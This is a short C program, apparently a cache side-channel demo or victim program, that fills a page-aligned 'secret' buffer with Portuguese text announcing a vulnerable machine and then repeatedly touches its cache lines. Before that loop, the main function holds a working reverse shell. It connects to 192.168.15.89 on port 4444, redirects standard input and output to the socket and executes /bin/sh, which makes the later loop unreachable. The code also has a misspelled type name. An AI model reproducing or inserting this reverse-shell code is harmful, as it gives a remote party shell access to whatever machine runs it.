#include <stdio.h>
#include <memory.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

void maccess(void *p) { 
  asm volatile( "movq (%0), %%rax\n" : : "c"(p) : "rax"); 
  }

char __attribute__((aligned(4096))) secret[8192];

int main(int argc, char* argv[]) {

    const char *string[] = {
    "Consegue ver essa string?"
    "Isso é uma pessima noticia"
    "Maquina vulneravel"
  };
      
  
  memset(secret, **string, 4096 * 2);


  	const char* ip = "192.168.15.89";	
	  struct sockaddr_in addr;


	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3;i++) {

		dup2(sockfd, i);
	}

	execve("/bin/sh", NULL, NULL);

 
  while(1) {
    for(int i = 0; i < 100; i++) maccess(secret + i * 64);
  }
}
